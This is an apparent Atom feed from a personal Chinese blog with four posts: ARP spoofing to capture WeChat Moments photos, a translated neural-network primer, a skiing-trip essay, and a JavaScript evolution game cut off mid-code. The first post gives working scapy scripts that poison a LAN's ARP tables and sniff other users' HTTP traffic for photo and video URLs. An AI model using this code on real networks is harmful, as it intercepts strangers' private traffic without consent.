<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Reverland的行知阁]]></title>
  <subtitle><![CDATA[开放、分享、自由与进步]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://reverland.org/"/>
  <updated>2016-03-09T02:24:26.797Z</updated>
  <id>http://reverland.org/</id>
  
  <author>
    <name><![CDATA[Liu Yuyang]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[收割朋友圈照片]]></title>
    <link href="http://reverland.org/security/2016/03/08/harvest-mm-pics/"/>
    <id>http://reverland.org/security/2016/03/08/harvest-mm-pics/</id>
    <published>2016-03-08T14:17:10.000Z</published>
    <updated>2016-03-09T02:24:26.797Z</updated>
    <content type="html"><![CDATA[<p>大概源于前一阵很火的微信朋友圈红包照片。</p>
<p>我记得那天是刚从长亭科技膜拜完离开，看到朋友圈满目的红包照片。</p>
<p>首先是BJ Nodejs的群里有人开始晒不给红包看照片，后来这些搞计算机的同学都不给红包了。。。</p>
<p>好多天之后，我想，干脆爬下朋友圈吧。</p>
<p>于是有下文。</p>
<h2 id="概述">概述</h2><p>目标：收割手机微信查看朋友圈时的照片</p>
<p>手段：ARP污染，告诉局域网内所有机器我是网关</p>
<h2 id="设置系统转发">设置系统转发</h2><p>确保：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reverland@localhost » cat /proc/sys/net/ipv4/ip_forward                                                                                               ~/tmp/sshjs  </span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="ARP污染">ARP污染</h2><p>首先，我熟悉的scapy</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 欺骗target我是网关</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line">gateway = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="comment"># 也许不必要</span></span><br><span class="line"><span class="comment"># 我只需要欺骗victim我是网关，把 请求 数据给我</span></span><br><span class="line"><span class="comment"># 获取网关</span></span><br><span class="line"><span class="comment"># route -n 0.0.0.0</span></span><br><span class="line"><span class="comment">### 本机ip</span></span><br><span class="line"><span class="comment"># ip addr show wlan0</span></span><br><span class="line"><span class="comment"># myip = '192.168.1.2'</span></span><br><span class="line"><span class="comment"># 获取目标MAC地址</span></span><br><span class="line"><span class="comment"># 1. arp -e 192.168.1.6</span></span><br><span class="line"><span class="comment"># 2. this way</span></span><br><span class="line"><span class="comment"># a, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff:ff')/ARP(op="who-has", psrc=myip, pdst=target),inter=RandNum(10,40), loop=0)</span></span><br><span class="line"><span class="comment"># targetMac = a[0][1]['ARP'].hwsrc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    send(ARP(op=<span class="string">"who-has"</span>, pdst=target, psrc=gateway))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>实际上这么一广播所有的机器都会把你当作网关。。。只要你时刻不停的污染下去。</p>
<p>警告：可能会触发杀毒软件啥的警报</p>
<h2 id="收割图片">收割图片</h2><p>匹配流量中图片地址就好，幸好微信消息是加密的, 只有朋友圈照片不加密。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prn</span><span class="params">(x)</span>:</span></span><br><span class="line">    s = x[<span class="string">'Raw'</span>].load.split(<span class="string">' '</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> s.find(<span class="string">'/mmsns/'</span>) &gt;= <span class="number">0</span> <span class="keyword">and</span> s.find(<span class="string">'/0?tp=webp'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'http://mmsns.qpic.cn'</span> + s.replace(<span class="string">'tp=webp'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">elif</span> s.find(<span class="string">'snsvideodownload'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'http://vweixinf.tc.qq.com'</span> + s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfilter</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x.haslayer(<span class="string">'Raw'</span>) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    s = x[<span class="string">'Raw'</span>].load.split(<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">sniff(iface=<span class="string">"wlan0"</span>, filter=<span class="string">"outbound and tcp and (port 80)"</span>, prn=prn, store=<span class="number">0</span>, lfilter=lfilter)</span><br></pre></td></tr></table></figure>
<p>That is all, have fun!</p>
<p>scapy 简直杀人越货的必备。发现该项目已经从bitbucket迁移到github上了。</p>
<p>没有做的</p>
<ol>
<li>把两个部分放到两个线程里</li>
<li></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>大概源于前一阵很火的微信朋友圈红包照片。</p>
<p>我记得那天是刚从长亭科技膜拜完离开，看到朋友圈满目的红包照片。</p>
<p>首先是BJ Nodejs的群里有人开始晒不给红包看照片，后来这些搞计算机的同学都不给红包了。。。</p>
<p>好多天之后，我想，干脆爬下朋]]>
    </summary>
    
      <category term="security" scheme="http://reverland.org/tags/security/"/>
    
      <category term="security" scheme="http://reverland.org/categories/security/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[神经网络101]]></title>
    <link href="http://reverland.org/machine-learning/2016/03/07/neural-network-101/"/>
    <id>http://reverland.org/machine-learning/2016/03/07/neural-network-101/</id>
    <published>2016-03-07T04:09:00.000Z</published>
    <updated>2016-03-07T12:17:05.748Z</updated>
    <content type="html"><![CDATA[<p>我被这个<a href="http://synaptic.juancazala.com/#/" target="_blank" rel="external">一群鱼</a>迷住了</p>
<p>意译自<a href="https://github.com/cazala/synaptic/wiki/Neural-Networks-101" target="_blank" rel="external">https://github.com/cazala/synaptic/wiki/Neural-Networks-101</a></p>
<p>一个不怎么关乎公式的简单神经网络介绍。</p>
<h2 id="神经元(Neuron)">神经元(Neuron)</h2><p>神经网络的基本单位。本质上，神经元有树突(输入)、细胞体(处理器)和轴突(输出)。</p>
<p>自然界中，激活过程大概这样：当神经元的累积加权输入超过特定阈值，轴突激发信号。</p>
<p>神经元最重要的特性是： 学习。</p>
<p>人工神经元是这样的：</p>
<p><img src="https://camo.githubusercontent.com/8b87e593fb9382c16a81cc059d994adec259a1c4/687474703a2f2f692e696d6775722e636f6d2f643654374b39332e706e67" alt="人工神经元"></p>
<p>它有几个输入，每个输入对应有权重(特定连接的重要性)。当要激活神经元的时候，<br>通过累加加权输入计算它的状态。但是神经元总有一个为1的额外的输入，叫偏差(bias)。</p>
<p>这确保既是所有输入都是0， 神经元仍然有输入。</p>
<p><img src="https://camo.githubusercontent.com/875a8f9cef6889b90dcd82752d12569456f385f0/687474703a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f735f6a25323025334425323025354373756d5f25374269253744253230775f253742696a2537442e795f25374269253744" alt=""></p>
<p>计算神经元状态(state)之后，神经元将值传递给激活函数(activation function)。<br>该函数将结果正则化(normalize)(到0-1)</p>
<p><img src="https://camo.githubusercontent.com/198be5a2e3b4b1e57758d46e4c324ac2c22671bd/687474703a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f795f6a253230253344253230665f6a253238535f6a253239" alt=""></p>
<h3 id="激活函数">激活函数</h3><p>激活函数通常是sigmoid函数，不是<a href="https://en.wikipedia.org/wiki/Logistic_function" target="_blank" rel="external">Logistic</a>()就是<a href="http://mathworld.wolfram.com/HyperbolicTangent.html" target="_blank" rel="external">Hyperbolic Tangent</a>(双曲正切).</p>
<p><img src="https://camo.githubusercontent.com/0bd79e6fd612e898fda2e04caa797648b8c0bed5/687474703a2f2f75706c6f61642e77696b696d656469612e6f72672f77696b6970656469612f636f6d6d6f6e732f7468756d622f382f38382f4c6f6769737469632d63757276652e7376672f33323070782d4c6f6769737469632d63757276652e7376672e706e67" alt="logistic"></p>
<h2 id="前向传播网络(Feed-forward_Network)">前向传播网络(Feed-forward Network)</h2><p>这是最简单的架构，神经元保存在层中，上一层的神经元连接所有下一层的神经元，<br>每一层的输出又是下一层的输入。</p>
<p><img src="https://camo.githubusercontent.com/0699ff876dbb371e894dec939c719287f5729aa9/687474703a2f2f692e696d6775722e636f6d2f3375394f52616c2e6a70673f31" alt="feed-forward network"></p>
<p>第一层(输入层)从环境接受输入，激活，它的输出作为下一层的输入，直到抵达最终层(输出层)。</p>
<h3 id="神经网络如何学习">神经网络如何学习</h3><p>通过训练。用来做这个算法叫做反向传播(backpropagation)。在给定网络输入后，<br>将产生输出。</p>
<p>接着，告诉网络该输入的理想输出。</p>
<p>下次，网络将采取这个理想输出并调整权重来产生更精确的输出，</p>
<p>从输出层反向调整直到输入层。</p>
<p>那么，下一次接受同样输入输出层将输出更接近的值，这个过程迭代多次，</p>
<p>直到网络输出和理想输出差距足够小。</p>
<h3 id="但是，反向传播如何工作？">但是，反向传播如何工作？</h3><p>算法通过<a href="http://en.wikipedia.org/wiki/Gradient_descent" target="_blank" rel="external">梯度下降</a>(Gradient Descent)来计算调整权重</p>
<p>比如如下图表示一个特定权重和误差(网络输出和理想输出差距)的关系。</p>
<p><img src="https://camo.githubusercontent.com/e6a0e02bd080acc585a622d2c03ca6e44a9e9adc/687474703a2f2f692e696d6775722e636f6d2f36565a6542706e2e706e67" alt="error vs weight"></p>
<p>该算法计算实际权重位置的梯度，也叫瞬时斜率(instant slope)(图中箭头)</p>
<p>它将向减小误差的方向移动，</p>
<p>这个过程将对网络中每个权重重复。</p>
<p><img src="https://camo.githubusercontent.com/eb2584182e5a40170553e668aa52cebb8a28c486/687474703a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f736c6f7065253230253344253230253543667261632537422535437061727469616c253230452537442537422535437061727469616c253230775f695f6a253744" alt=""></p>
<p>为了计算梯度和调整权重，我们使用增量(δ)法则</p>
<h3 id="增量法则">增量法则</h3><p>输出层θ的增量使用注入误差(injected error)(网络输出和理想输出的差距)<br>来计算。</p>
<p><img src="https://camo.githubusercontent.com/4710fab5a0e844de6d1f1724c1b88b8c787baf08/687474703a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f455f2535435468657461253230253344253230742532302d253230795f2535435468657461" alt=""><br><img src="https://camo.githubusercontent.com/3b840b789a63f6b24b0bfa7fb988661af225ffc7/687474703a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f25354364656c74612532305f2535435468657461253230253344253230455f25354354686574612532302e66253237253238735f2535435468657461253230253239" alt=""></p>
<p>f’是激活函数的导函数。’</p>
<p>这个误差反向传播到输入层，每一层都使用上一层的δs来计算本层的δ</p>
<p><img src="https://camo.githubusercontent.com/52802a14da3a104ba1c5a615c4549723a9d8857f/687474703a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f455f6a25323025334425323025354373756d25323025354364656c74612532305f6b253230775f6b5f6a" alt=""><br><img src="https://camo.githubusercontent.com/cb17a45676307f2e0d93da911284ce4a9d99a172/687474703a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f25354364656c74615f6a253230253344253230455f6a2e66253237253238535f6a253239" alt=""></p>
<p>我们使用delta来计算每个权重的梯度：</p>
<p><img src="https://camo.githubusercontent.com/8cc240df2a9475c2a0b1efd25fc20da49c9d10a4/687474703a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f253543667261632537422535437061727469616c253230455f6a2537442537422535437061727469616c253230775f695f6a25374425323025334425323025354364656c74615f6a2532302e253230795f69" alt=""></p>
<p>现在根据反向传播更新权重：</p>
<p><img src="https://camo.githubusercontent.com/052920e4d54e7c529bc571ef6c7c9a38f5c0e74a/687474703a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f25354344656c7461253230775f695f6a253230253344253230253543766172657073696c6f6e253230253543667261632537422535437061727469616c253230455f6a2537442537422535437061727469616c253230775f695f6a253744" alt=""></p>
<p>这里ε是学习率(learning rate).</p>
<p>译注: 推导见<a href="https://en.wikipedia.org/wiki/Backpropagation#Derivation" target="_blank" rel="external">维基百科</a></p>
<h2 id="时间递归神经网络(Recurrent_Neural_Networks)">时间递归神经网络(Recurrent Neural Networks)</h2><p>这个网络中的神经元自连接(固定权重1)，这让它们有某种短期记忆。</p>
<p><img src="https://camo.githubusercontent.com/a60c701dea057ea0ac5634b09713b3d3e4867ec8/687474703a2f2f75706c6f61642e77696b696d656469612e6f72672f77696b6970656469612f636f6d6d6f6e732f642f64642f526563757272656e744c617965724e657572616c4e6574776f726b2e706e67" alt=""></p>
<p>过去激励的额外输入使网络有某种上下文信息，有助于特定任务产生更好的输出。</p>
<p>在序列预测任务上，这种神经网络非常有效，但是它们不能记得过去太多步的相关信息</p>
<h3 id="Constant_Error_Carousel">Constant Error Carousel</h3><p>CEC包含自连接的神经元，我们称为记忆细胞，一个线性激励函数(linear activation)。</p>
<p>这使误差保持更长时间，修复了时间递归神经网络的梯度退化问题–RNN缩放每个激励的误差<br>因为squashing function的导数，当它在时空上往回传播,误差会指数消失或分叉(diverge，就是震荡)。听起来真他妈的酷!</p>
<p>译注：问题在于误差会因为和squashing function(比如logistic激励函数)的导数相乘，还和自连接权重相乘(所以规定为1)，<br>如果squashing function是线性的，那么其导数也为1，则，误差就不会消失或分叉。</p>
<h3 id="Gates">Gates</h3><p>有的结构不仅将神经元连接，而且调控流过这些连接的信息，这些结构叫做二阶神经网络(second order neural networks)</p>
<p>译注：因为gate是和连接相乘，则成为二阶了。</p>
<p>一种保护记忆细胞远离噪音输入和注入误差的方式是使用gates来缩放(scale，调控意)记忆细胞和输入输出层之间的连接。</p>
<p><img src="https://camo.githubusercontent.com/62372f7a1977651a77ffe961f1d23fb86b5472af/687474703a2f2f7777772e77696c6c616d657474652e6564752f253745676f72722f636c61737365732f63733434392f666967732f6c73746d2e676966" alt=""></p>
<p>这就是<a href="http://en.wikipedia.org/wiki/Long_short_term_memory" target="_blank" rel="external">Long Short-Term Memory</a>的起源。LSTM是一种适合分类、处理和<br>预测时间序列的结构，特别是当关键事件中有许多非常长且未知的时间延迟。</p>
<p>自从它的概念被第三个gate提升，叫做Forget Gate，这个管理记忆细胞的自连接，决定有多少<br>误差应该被记住，并且何时忘记。通过在每个time-step后scaling来自细胞状态的反馈实现。<br>这保护了状态不至于分叉(diverging, 同上)和崩塌(collapsing，消失)。</p>
<p>LSTM通过来自记忆细胞到所有它的其他gates的窥视孔(peephole)连接，改善它们的性能。<br>因为它们有有关它们保护细胞的信息。实际的LSTM结构看起来像这样。</p>
<p><img src="https://camo.githubusercontent.com/90fd23066ab0110cd317bfb580a13544f46b9ec9/687474703a2f2f692e696d6775722e636f6d2f4a7046363577632e706e67" alt=""></p>
<p>时间递归和二阶神经网络(Recurrent and Second Order Neural Networks)比前向传播神经网络相比复杂。数学细节可以参考<a href="http://www.overcomplete.net/papers/nn2012.pdf" target="_blank" rel="external">Derek Monner的论文</a></p>
<p>译者注：关于LSTM，<a href="http://colah.github.io/posts/2015-08-Understanding-LSTMs/" target="_blank" rel="external">colah的文章</a>讲的很清晰易懂。</p>
<p>有了这些基础知识，现在你可以好好玩神经网络了。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>我被这个<a href="http://synaptic.juancazala.com/#/" target="_blank" rel="external">一群鱼</a>迷住了</p>
<p>意译自<a href="https://github.com/cazala/sy]]>
    </summary>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="neural network" scheme="http://reverland.org/tags/neural-network/"/>
    
      <category term="machine learning" scheme="http://reverland.org/categories/machine-learning/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[竟不知做何言]]></title>
    <link href="http://reverland.org/life/2016/02/28/say-something/"/>
    <id>http://reverland.org/life/2016/02/28/say-something/</id>
    <published>2016-02-28T12:00:42.000Z</published>
    <updated>2016-02-28T14:18:50.084Z</updated>
    <content type="html"><![CDATA[<p>我不说话，这是最好的。</p>
<p>可惜总想写些什么，好像文字真能凝固时间，让短暂的生命和稍纵即逝的时光成为永恒。</p>
<p>然而并不行。</p>
<p>人生五十年，与下天相比，不过一瞬，一度得生者，岂有不灭者乎？</p>
<h2 id="西">西</h2><p>离家的火车漫漫长长，不知将何时失去的，拥有却无力紧握的，过去，现在，未来，恍恍惚惚。</p>
<p>右边的大妈在嗑瓜子，左边的妹子在背单词，后面的夫妇在哄孩子，我的喉咙里像卡了一根刺。</p>
<p>列车停到了郑州站，一种名字熟悉感觉陌生的城市。我踱到车门口，想要点根烟，也不想点烟。</p>
<p>陆陆续续出来两三个人，都迫不及待的点上一根，顿时车门口烟雾缭绕，如云似幻。</p>
<p>然而回去坐下了，既然不抽烟，我到门口干啥呢？</p>
<h2 id="土">土</h2><p>车辆离开，窗外依然是无尽的平原，无尽的。</p>
<p>列车从xy站发，列车向北京站去，列车却开进了无边无际，列车不知道行驶在哪里。</p>
<p>我躲到车门，倚着车门，看着田野村舍，人点坟头。</p>
<p>这条路好像永远也到不了头。</p>
<p>唱一首月亮河，风景一一远去，远处的山野起伏，我也是他们的过客。</p>
<h2 id="城">城</h2><p>窗外千篇一律到百无聊赖，低头看看手机，刘老师发来一个消息：</p>
<p>“这周末去长城岭，报名吗？”</p>
<p>这对我来说, 并非一个问句。</p>
<h2 id="路">路</h2><p>五个小时的夜车，天上的猎户，刺眼的天狼，隐约的北极星，隧道的光影，和室友吹那些年吹过的牛逼。</p>
<p>大山深处风飘雪，寂寂皑皑夜听风。</p>
<h2 id="十">十</h2><p>早上，大叔拉开窗帘，雪山映入眼帘。</p>
<p>风中飘雪，雾凇满山，蓝天湛湛，白云悠悠。</p>
<p>在缆车上，右边坐着从石家庄由参加制药公司组织活动的初滑妹子。</p>
<p>在缆车上，左边坐着来自唐山的东北血统感慨只考了第四没进前三的四年级孩子</p>
<p>在缆车上，右边坐着张家口上学最后一滑的汉子</p>
<p>在缆车上，左边坐着抱着单板在这里顺便买了套房的土豪妹子</p>
<p>在缆车上，右边坐着明明滑得特别勤却总说来的少懒得滑的妹子</p>
<p>他们是什么样大多我都不知道，</p>
<p>他们肯定不知道我什么样。</p>
<p>几乎都是上车相谈下车散，并无二致。</p>
<p>小朋友对我说，你把帽子雪镜拿下来吧，我还没看到过你什么样呢。我说，下去再去掉，然而食言了。</p>
<p>三十年看山是山，三十年看山不是山，三十年看山还是山。</p>
<p>呵呵，没人明白我为啥说这句，正如整篇文章，只是属于一个人的密码，开启心灵之门的钥匙，也许也会打开其他门吧。</p>
<h2 id="号">号</h2><p>晚上怎么也睡不着。</p>
<p>午饭时候，刘老师千辛万苦联系上我时。我已经不知道我是谁，忘记身体的极限，忘记了时间，忘记了开始的打算，完全沉浸在轮回般的无限热情和悲哀中，一遍一遍缆车上去雪道下来，上去下来上去下来。</p>
<p>感觉自己的指甲掉到袜子里，想象之中血已经染红袜子了吧。</p>
<p>刘老师说：带你去山顶吧。</p>
<p>豁然开朗天宽阔，万里群山尽白头。</p>
<h2 id="再">再</h2><p>对雪季的最后几天还有好多想法，想起室友说要去，想起马老板和松神说要去，想起Laura.T说要喊她一起去，想起扯旗说要下周去，想起SuperTeddy打算下周去。虽然来来去去雪泥鸿爪，却期待能在皑皑白雪中一起玩耍呢。</p>
<p>站在山下干看着漫天飞雪，看着人来人往雪中飞扬。</p>
<p>雪季在这里提前结束。</p>
<h2 id="见">见</h2><p>刘老师听说指甲伤了说要来找我，来来回回两趟，又是上药又是一大堆东西。只是一时觉得不知该说什么该怎么做，很多记忆纷至沓来，熟悉的感觉，熟悉的心情，一切都是熟悉的，好像过去现在未来什么都没有变。</p>
<p>想起那些年生日收到的蛋糕，想起冒着蒸汽的水杯，想起逃命时回头把我拉起的手臂，想起安慰我联系家人送我上车的路人证件，想起感冒的一塌糊涂时候的一袋子梨，想起自行车载着我从山上的斜坡驶下，<br>想起从医院一起走回的路，荡悠悠的钥匙链，快餐店的灯光侧脸，图书馆大楼下的恋恋不舍，一种命运的似曾相识无力感，一种幻灭。</p>
<p>人心是一种什么东西啊。</p>
<p>我希望我感受到的，在这残酷的世界里，也能留下温暖的记忆。</p>
<p>未来呢？我没有信心也有信心，我需要信心也不需要信心。</p>
<p>人心至柔，柔则至坚。</p>
<p>吾性自晦，晦以自明。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>我不说话，这是最好的。</p>
<p>可惜总想写些什么，好像文字真能凝固时间，让短暂的生命和稍纵即逝的时光成为永恒。</p>
<p>然而并不行。</p>
<p>人生五十年，与下天相比，不过一瞬，一度得生者，岂有不灭者乎？</p>
<h2 id="西">西</h2><p>离家]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Evolving Game Once More]]></title>
    <link href="http://reverland.org/javascript/2016/02/26/evolving-game-once-more/"/>
    <id>http://reverland.org/javascript/2016/02/26/evolving-game-once-more/</id>
    <published>2016-02-26T07:52:08.000Z</published>
    <updated>2016-03-07T08:22:42.582Z</updated>
    <content type="html"><![CDATA[<p>这里的第一篇文章标示的日期是2012年2月7日，到今天，眨眼间4年多过去了。没想到竟然断断续续写了四年。</p>
<p>感谢vimwiki，感谢jekyll，感谢hexo，感谢开源社区和贡献者们。</p>
<p>感谢bitbucket，感谢github，感谢gitcafe，感谢凤凰君曾经的嗯静态博客托管。</p>
<p>感谢每一个鼓励的朋友。</p>
<p>竟然四年了。去年想就这么算了吧，域名也没续费。结果服务商凤凰君给设置自动续费了，现在域名才继续能用。。</p>
<p>开始正题吧。</p>
<p>希望在这里写下的每篇文章，简单而快乐。</p>
<h2 id="A_GAME">A GAME</h2><p>我编程的入门从一本叫Land of Lisp的书开始，这里给我揭开了web server的迷雾，揭开了socket的迷雾，揭开了svg的迷雾，甚至揭开了AI的迷雾。</p>
<p>这本书中有一个模拟自然界的小游戏<a href="http://reverland.org/lisp/2012/05/06/using-loop-to-evolve/">使用loop来进化</a>。</p>
<p>一个非常简单但非常有意思的游戏，我还记得为了想要更大的世界，让cpu和io卡顿异常的记忆。</p>
<p>多年以后，看到有本叫eloquent javascript的书中有另外一个类似的例子<a href="http://eloquentjavascript.net/07_elife.html" target="_blank" rel="external">电子生命</a>。</p>
<p>我就想说这个游戏。</p>
<h2 id="图形界面">图形界面</h2><p>感谢Marijn Haverbeke，面向对象带来了非常好的组件化效果，随便加个函数就实现了图形界面的变更。</p>
<p>我这里将实现4种界面：</p>
<ul>
<li>terminal</li>
<li>dom</li>
<li>canvas</li>
<li>webGL</li>
</ul>
<p>首先，world类的constructor需要根据准备画布，如果试canvas或者webgl还要做好调整和准备工作。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line"> * class World</span><br><span class="line"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">World</span> </span>&#123;</span><br><span class="line">  constructor(map, legend, canvas, canvasLegend, size, flag) &#123;</span><br><span class="line">    <span class="keyword">this</span>.grid = <span class="keyword">new</span> Grid(map[<span class="number">0</span>].length, map.length);</span><br><span class="line">    <span class="keyword">this</span>.legend = legend;</span><br><span class="line">    <span class="keyword">if</span> (canvas) &#123;</span><br><span class="line">      <span class="comment">//canvas</span></span><br><span class="line">      <span class="keyword">this</span>._canvasLegend = canvasLegend;</span><br><span class="line">      <span class="keyword">this</span>._canvas = canvas;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>._canvas.width = map[<span class="number">0</span>].length * size;</span><br><span class="line">      <span class="keyword">this</span>._canvas.height = map.length * size;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>._size = size;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (flag == <span class="string">'dom'</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>._canvas.style.width = <span class="keyword">this</span>._canvas.width + <span class="string">'px'</span>;</span><br><span class="line">        <span class="keyword">this</span>._canvas.style.height = <span class="keyword">this</span>._canvas.height + <span class="string">'px'</span>;</span><br><span class="line">        <span class="keyword">this</span>.draw = <span class="keyword">this</span>.drawDom;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (flag == <span class="string">'canvas'</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>._ctx = canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">        <span class="keyword">this</span>.draw = <span class="keyword">this</span>.drawCanvas;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (flag == <span class="string">'webgl'</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> gl = canvas.getContext(<span class="string">'webgl'</span>);</span><br><span class="line">        <span class="keyword">this</span>._gl = gl;</span><br><span class="line">        gl.clearColor(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1.0</span>);</span><br><span class="line">        gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);</span><br><span class="line">        gl.viewport(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>._canvas.width, <span class="keyword">this</span>._canvas.height);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> v = <span class="string">`</span><br><span class="line">        //这部分是顶点着色器  </span><br><span class="line">        attribute vec2 aVertexPosition;</span><br><span class="line">        void main() &#123;</span><br><span class="line">            gl_Position = 